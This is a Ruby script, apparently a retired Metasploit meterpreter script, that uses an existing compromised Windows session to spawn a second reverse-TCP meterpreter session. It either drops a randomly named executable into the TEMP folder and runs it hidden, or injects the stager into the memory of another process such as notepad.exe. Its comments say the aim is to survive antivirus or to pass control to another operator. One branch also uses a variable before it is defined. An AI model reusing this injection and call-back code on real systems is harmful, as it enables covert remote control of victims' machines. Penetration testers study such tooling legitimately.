##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##


# Author: Scriptjunkie
# Uses a meterpreter session to spawn a new meterpreter session in a different process.
# A new process allows the session to take "risky" actions that might get the process killed by
# A/V, giving a meterpreter session to another controller, or start a keylogger on another
# process.
#

#
# Options
#
opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
  "-r"  => [ true,   "The IP of a remote Metasploit listening for the connect back"],
  "-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4546)"],
  "-w"  => [ false,  "Write and execute an exe instead of injecting into a process"],
  "-e"  => [ true,   "Executable to inject into. Default notepad.exe, will fall back to spawn if not found."],
  "-P"  => [ true,   "Process id to inject into; use instead of -e if multiple copies of one executable are running."],
  "-s"  => [ false,  "Spawn new executable to inject to.  Only useful with -P."],
  "-D"  => [ false,  "Disable the automatic exploit/multi/handler (use with -r to accept on another system)"]
)

#
# Default parameters
#

rhost    = Rex::Socket.source_address("1.2.3.4")
rport    = 4546
lhost    = "127.0.0.1"

spawn = false
autoconn = true
inject   = true
target_pid = nil
target    = "notepad.exe"
pay      = nil

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
  case opt
  when "-h"
    print_line(opts.usage)
    raise Rex::Script::Completed
  when "-r"
    rhost = val
  when "-p"
    rport = val.to_i
  when "-P"
    target_pid = val.to_i
  when "-e"
    target = val
  when "-D"
    autoconn = false
  when "-w"
    inject = false
  when "-s"
    spawn = true
  end
end

print_status("Creating a reverse meterpreter stager: LHOST=#{rhost} LPORT=#{rport}")

payload = "windows/meterpreter/reverse_tcp"
pay = client.framework.payloads.create(payload)
pay.datastore['LHOST'] = rhost
pay.datastore['LPORT'] = rport
mul = client.framework.exploits.create("multi/handler")
mul.share_datastore(pay.datastore)
mul.datastore['WORKSPACE'] = client.workspace
mul.datastore['PAYLOAD'] = payload
mul.datastore['EXITFUNC'] = 'process'
mul.datastore['ExitOnSession'] = true
print_status("Running payload handler")
mul.exploit_simple(
  'Payload'  => mul.datastore['PAYLOAD'],
  'RunAsJob' => true
)

if client.platform == 'windows'
  server = client.sys.process.open

  print_status("Current server process: #{server.name} (#{server.pid})")

  if ! inject
    exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
    print_status("Meterpreter stager executable #{exe.length} bytes long")

    #
    # Upload to the filesystem
    #
    tempdir = client.sys.config.getenv('TEMP')
    tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
    tempexe.gsub!("\\\\", "\\")

    fd = client.fs.file.new(tempexe, "wb")
    fd.write(exe)
    fd.close
    print_status("Uploaded the agent to #{tempexe} (must be deleted manually)")

    #
    # Execute the agent
    #
    print_status("Executing the agent with endpoint #{rhost}:#{rport}...")
    pid = session.sys.process.execute(tempexe, nil, {'Hidden' => true})
  elsif ! spawn
    # Get the target process name
    print_status("Duplicating into #{target}...")

    # Get the target process pid
    if not target_pid
      target_pid = client.sys.process[target]
    end

    if not target_pid
      print_error("Could not access the target process")
      print_status("Spawning a notepad.exe host process...")
      note = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
      target_pid = note.pid
    end
  else
    print_status("Spawning a #{target} host process...")
    newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
    target_pid = newproc.pid
    if not target_pid
      print_error("Could not create a process around #{target}")
      raise Rex::Script::Completed
    end
  end

  # Do the duplication
  print_status("Injecting meterpreter into process ID #{target_pid}")
  host_process = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
  raw = pay.generate
  mem = host_process.memory.allocate(raw.length + (raw.length % 1024))

  print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
  print_status("Writing the stager into memory...")
  host_process.memory.write(mem, raw)
  host_process.thread.create(mem, 0)
  print_status("New server process: #{target_pid}")

else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
